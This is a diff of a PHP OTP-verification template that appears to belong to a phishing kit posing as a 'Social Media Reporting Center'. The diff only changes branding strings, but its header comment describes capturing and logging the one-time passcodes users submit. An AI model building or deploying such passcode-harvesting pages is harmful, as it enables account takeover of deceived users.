@@ -1,7 +1,7 @@
 <?php
 /* ================================================================
    templates/otp_verify.php
-   Social Media Reporting Center --OTP Verification Handler
+   Social Media Reporting --OTP Verification Handler
    Appends OTP to submission file, saves separate OTP file,
    logs to terminal, returns a confirmation HTML page.
    ================================================================ */
@@ -106,7 +106,7 @@ $otp_file_path = $otps_dir . '/' . $otp_file_name;
 
 $otp_record = implode("\n", [
     $divider,
-    'SOCIAL MEDIA REPORTING CENTER --OTP Record',
+    'Social Media Reporting --OTP Record',
     'Timestamp     : ' . date('Y-m-d H:i:s T'),
     'OTP Code      : ' . $otp_digits,
     'Submission ID : ' . ($safe_id ?? '(not linked)'),
@@ -157,7 +157,7 @@ function smr_otp_render_success(): void {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification Complete --Social Media Reporting Center</title>
+  <title>Verification Complete --Social Media Reporting</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -231,7 +231,7 @@ function smr_otp_render_error(string $error_msg): void {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification Error --Social Media Reporting Center</title>
+  <title>Verification Error --Social Media Reporting</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
